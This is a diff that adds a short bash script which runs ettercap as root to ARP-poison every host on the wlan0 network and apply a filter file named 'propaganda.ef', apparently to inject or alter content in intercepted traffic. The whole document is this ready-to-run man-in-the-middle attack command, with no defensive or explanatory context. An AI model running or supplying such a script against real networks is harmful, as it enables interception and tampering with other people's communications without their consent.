@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo ettercap -TqM ARP:REMOTE -F ~/propaganda.ef -i wlan0 // //
